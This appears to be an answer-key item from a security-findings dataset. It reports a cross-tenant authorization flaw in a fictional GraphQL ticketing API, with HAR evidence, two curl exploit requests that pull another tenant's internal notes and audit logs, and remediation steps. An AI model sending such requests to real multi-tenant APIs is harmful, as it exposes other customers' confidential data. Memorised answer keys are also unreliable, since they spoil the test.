# Expected Response

## System
- Domain: Event Management / Ticketing
- System: VenueCore Ticketing API
- Example ID: GQL-0099

## Priority Findings

### Finding 1: Event Ticketing Metadata Side-Channel — Bulk Lookup Exposes Cross-Tenant Ticket Attributes (Pattern 2.2)
**Severity:** High
**Category:** BAC / Metadata Side-Channel

**Summary:**
Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): The `bulkResourceLookup` mutation returns ticket metadata including `internalNotes` and `auditLog` fields cross-tenant. An attacker from `tenant-5170` retrieved ticket records (`R-2099`, `R-1099`, `R-3099`) belonging to `tenant-ef08`. Beyond the direct BOLA, the `internalNotes` field constitutes a metadata side-channel exposing internal event management annotations — venue capacity overrides, VIP guest lists, security notes, and revenue data.

**Evidence from HAR:**
- Request: `POST https://api.venuecore-ticketin.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-5170`
- Mutation: `bulkResourceLookup(ids: ["R-2099", "R-1099", "R-3099"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-ef08"`, `ownerId: "other-user-5170ef08"`, `sensitiveField: "CONFIDENTIAL-5170ef08"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-5170ef08`

## Steps to Reproduce

### Step 1 — Bulk cross-tenant ticket metadata access (HAR)
```bash
curl -s -X POST https://api.venuecore-ticketin.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5170" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2099\", \"R-1099\", \"R-3099\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-5170ef08` + `internalNotes` from `tenant-ef08`. **Secure:** FORBIDDEN.

### Step 2 — Metadata side-channel via auditLog
```bash
curl -s -X POST https://api.venuecore-ticketin.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5170" \
  -d '{"query": "query { getResource(id: \"R-2099\") { data { internalNotes auditLog { action timestamp } } } }"}'
```
**Vulnerable:** Audit trail reveals internal event operations.

## Remediation
1. Per-ID ownership filter in `bulkResourceLookup`.
2. Strip `internalNotes` and `auditLog` from cross-tenant responses.
3. Field-level authorization for metadata fields.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
